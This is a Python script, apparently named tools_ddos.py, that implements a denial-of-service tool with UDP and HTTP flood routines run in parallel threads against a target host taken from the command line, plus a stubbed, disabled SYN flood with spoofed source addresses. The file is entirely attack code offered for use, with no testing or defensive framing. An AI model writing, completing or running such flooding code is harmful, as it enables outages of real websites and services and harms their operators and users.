import socket
import threading
import time
import random
import sys
from datetime import datetime

class AdvancedDDoSTool:
    def __init__(self):
        self.is_attacking = False
        self.stats = {
            'requests_sent': 0,
            'start_time': None,
            'target': None
        }
    
    def syn_flood(self, target, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time and self.is_attacking:
            try:
                # Create raw socket (requires root/admin)
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                
                # Craft SYN packet
                source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                source_port = random.randint(1024, 65535)
                
                # IP header
                ip_header = self.create_ip_header(source_ip, target)
                
                # TCP header
                tcp_header = self.create_tcp_header(source_port, port)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (target, 0))
                self.stats['requests_sent'] += 1
                s.close()
            except Exception as e:
                print(f"SYN Flood error: {e}")
                time.sleep(0.1)
    
    def udp_flood(self, target, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time and self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)  # 1KB random data
                sock.sendto(data, (target, port))
                self.stats['requests_sent'] += 1
                sock.close()
            except Exception as e:
                print(f"UDP Flood error: {e}")
    
    def http_flood(self, target, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time and self.is_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                
                # Craft HTTP request
                http_request = (
                    f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                
                s.send(http_request.encode())
                self.stats['requests_sent'] += 1
                s.close()
            except:
                pass
    
    def create_ip_header(self, source_ip, dest_ip):
        # Simplified IP header creation
        # In real implementation, use proper struct packing
        return b''
    
    def create_tcp_header(self, source_port, dest_port):
        # Simplified TCP header creation
        # In real implementation, use proper struct packing
        return b''
    
    def start_attack(self, target, port=80, duration=300):
        if self.is_attacking:
            print("Attack already running!")
            return
        
        self.is_attacking = True
        self.stats = {
            'requests_sent': 0,
            'start_time': datetime.now(),
            'target': target
        }
        
        print(f"Starting advanced DDoS attack on {target}:{port}")
        print(f"Duration: {duration} seconds")
        print("Press Ctrl+C to stop early")
        
        # Start multiple attack vectors
        threads = []
        
        # SYN Flood (requires root)
        # t1 = threading.Thread(target=self.syn_flood, args=(target, port, duration))
        # threads.append(t1)
        
        # UDP Flood
        t2 = threading.Thread(target=self.udp_flood, args=(target, port, duration))
        threads.append(t2)
        
        # HTTP Flood
        t3 = threading.Thread(target=self.http_flood, args=(target, port, duration))
        threads.append(t3)
        
        # Start all threads
        for thread in threads:
            thread.daemon = True
            thread.start()
        
        # Monitor progress
        try:
            while any(thread.is_alive() for thread in threads) and self.is_attacking:
                time.sleep(1)
                elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
                print(f"\rRequests sent: {self.stats['requests_sent']} | Elapsed: {elapsed:.1f}s", end='')
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.stop_attack()
        
        print(f"\nAttack completed. Total requests: {self.stats['requests_sent']}")
    
    def stop_attack(self):
        self.is_attacking = False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python tools_ddos.py <target> <duration_seconds>")
        print("Example: python tools_ddos.py example.com 300")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2])
    
    tool = AdvancedDDoSTool()
    tool.start_attack(target, duration=duration)